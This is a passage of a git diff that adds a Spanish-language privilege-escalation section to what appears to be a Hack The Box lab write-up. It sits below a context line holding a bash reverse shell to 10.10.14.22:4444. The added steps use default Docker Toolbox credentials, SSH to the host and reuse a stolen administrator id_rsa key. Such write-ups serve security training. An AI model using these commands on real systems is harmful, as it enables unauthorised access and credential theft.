@@ -85,5 +85,35 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'
 
 ## ESCALADA DE PRIVILEGIOS
 
+La herramienta toolbox usa VM para contener. Estos archivos son distribuciones de vitualbox y las crdenciales normalmente predefinidas son docker / tcuser. Vamos a ver nuestra ip
 
+![image](https://github.com/D4l1-web/HTB/assets/79869523/b2e4c6df-2def-4ddc-b42e-91b85721d9cf)
 
+Vemosq ue nuestra ip es la 0.2 y que hay un host en la 0.1 vamos a intentar hacer un ssh importanto una shell buena
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh docker@172.17.0.1
+```
+
+Estamos dentro
+
+![image](https://github.com/D4l1-web/HTB/assets/79869523/2af11a90-56d5-45fb-a0c7-fb9391aebdf1)
+
+Ahora dentro vamos a irnos a los archivos definidos y nos vamos a C:\Users y nos vamos al archivo oculto .ssh
+
+![image](https://github.com/D4l1-web/HTB/assets/79869523/662be5e1-7098-42b8-b535-e8fd9f80a99a)
+
+![image](https://github.com/D4l1-web/HTB/assets/79869523/17e5858f-48fc-42f0-9d32-2fd9878a82d9)
+
+![image](https://github.com/D4l1-web/HTB/assets/79869523/6d9b3bf3-0cea-46bf-84bf-e1b401fa3b8d)
+
+Para poder entrar con la id_rsa debera tener los permisos
+```
+chmod 600 id_rsa
+ssh administrator@ip -i id_rsa
+```
+![image](https://github.com/D4l1-web/HTB/assets/79869523/46e4864e-b024-486d-9653-b87b50ccdc12)
+
+![image](https://github.com/D4l1-web/HTB/assets/79869523/fbdc291e-37f4-46ab-8b7f-e7ed4f5ec85d)
+
+GG
